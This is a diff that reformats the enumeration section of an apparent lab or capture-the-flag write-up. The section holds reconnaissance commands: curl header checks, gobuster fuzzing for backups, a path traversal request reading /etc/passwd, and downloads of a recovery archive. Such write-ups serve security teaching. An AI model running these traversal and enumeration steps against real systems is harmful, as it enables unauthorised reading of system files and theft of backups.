@@ -34,29 +34,33 @@ The Sandbox Flaw: Testing standard filenames first showed the app readily accept
 
 **ENUMERATION**
 
-1. Initial Reconnaissance & Connectivity Check
+**1. Initial Reconnaissance & Connectivity Check**
+   
     Verify the target is up and inspect response headers
    
    curl -I http://<target-ip>:<port>/
 
-**3. Directory & File Fuzzing (Gobuster)**
-4. 
+**2. Directory & File Fuzzing (Gobuster)**
+
 Search for hidden backup archives, scripts, or unindexed recovery endpoints
 gobuster dir -u http://<target-ip>:<port>/ -w /usr/share/wordlists/dirb/common.txt -x bak,zip,txt,old,sql,php
 
- 3. Path Traversal & File Inclusion Testing (Curl)
- 4. 
+ **3. Path Traversal & File Inclusion Testing (Curl)**
+    
 Test if parameters are vulnerable to directory traversal to read system files or backup logs
 curl -s "http://<target-ip>:<port>/index.php?file=../../../../etc/passwd"
 **
-4. Downloading Discovered Recovery Artifacts**
+
+**4. Downloading Discovered Recovery Artifacts****
+   
   Pull down any identified backup archives or sensitive files found during enumeration
   curl -O http://<target-ip>:<port>/backups/recovery.zip
   Alternatively using wget:
 
 wget http://<target-ip>:<port>/backups/recovery.zip
 **
-5. Extraction & Analysis**
+
+**5. Extraction & Analysis**
 
 Unpack the recovered archive to inspect application source code or hidden keys
 unzip recovery.zip
